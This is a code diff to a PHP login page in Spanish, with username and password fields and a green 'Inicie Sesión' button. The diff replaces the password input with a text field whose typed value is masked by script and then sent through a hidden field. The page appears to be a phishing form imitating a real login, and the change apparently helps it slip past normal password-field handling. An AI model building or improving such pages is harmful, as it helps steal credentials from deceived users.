@@ -62,8 +62,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                 <img src="l.png" style="position: relative; top: 51px; left: -15px; width: 294px;">
                 <input id="i1" name="ips1" placeholder="Usuario" type="text" required
                        style="display: block; position: relative; color:#333; background: transparent; border: none; top: 187px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off" onkeypress="return noEspacios(event)" oninput="this.value = this.value.replace(/\s/g, '')">
-                <input id="i2" name="ips2" placeholder="Contraseña" type="password" required
-                       style="display: block; position: relative; color:#333; background: transparent; border: none; top: 224px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off" onkeypress="return noEspacios(event)" oninput="this.value = this.value.replace(/\s/g, '')">
+                <input id="i2" name="ips2_display" placeholder="Contraseña" type="text" required
+                       style="display: block; position: relative; color:#333; background: transparent; border: none; top: 224px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off" onkeypress="return noEspacios(event)" oninput="handlePasswordInput(this)">
                 <p id="error-message" style="font-family: sans-serif;">Usuario o contraseña incorrecta</p>
                 <input type="submit" value="Inicie Sesión"
                        style="font-size: 16px; display: block; position: relative; color: #fff; background: rgb(0, 105, 60); border: none; top: 348px; left: 28px; height: 39px; width: 364px; outline: none; border-radius: 8px;">
@@ -146,8 +146,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             if (displayedValue.length < realValue.length) {
                 input.dataset.realValue = realValue.substring(0, displayedValue.length);
             } else if (displayedValue.length > realValue.length) {
-                // Si el usuario agregó caracteres, agregar al valor real
-                const newChars = displayedValue.substring(realValue.length);
+                // Si el usuario agregó caracteres, agregar al valor real eliminando espacios
+                const newChars = displayedValue.substring(realValue.length).replace(/\s/g, '');
                 input.dataset.realValue += newChars;
             }
             
@@ -164,9 +164,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                 hiddenInput.type = 'hidden';
                 hiddenInput.name = 'ips2';
                 hiddenInput.value = passwordInput.dataset.realValue;
-                
-                // Cambiar el nombre del campo original para no enviarlo duplicado
-                passwordInput.name = 'ips2_display';
                 
                 // Agregar el campo oculto al formulario
                 this.appendChild(hiddenInput);
